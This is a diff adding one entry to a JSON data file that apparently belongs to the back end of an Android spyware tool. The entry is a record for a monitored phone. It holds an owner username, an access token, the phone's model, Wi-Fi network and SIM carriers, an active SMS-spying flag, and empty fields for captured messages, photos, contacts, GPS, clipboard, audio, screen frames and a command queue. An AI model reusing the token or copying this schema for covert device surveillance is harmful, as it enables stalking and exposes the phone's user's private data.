@@ -21868,5 +21868,37 @@
       "frameId": 265,
       "capturedAt": 1775382521222
     }
+  },
+  {
+    "deviceId": "aimlock_9f404d09",
+    "deviceName": "HP-REQ-318E",
+    "ownerUsername": "ardan",
+    "token": "dab24ba515eac2d9e8f038fb44a94cf9",
+    "lastSeen": 1775384506475,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-05T10:21:46.475Z",
+    "deviceInfo": {
+      "model": "INFINIX Infinix X6525",
+      "androidVersion": "Android 13",
+      "battery": 86,
+      "network": "WiFi: NAZURA.NET",
+      "sim1": "XL Axiata",
+      "sim2": "Indosat Ooredoo"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
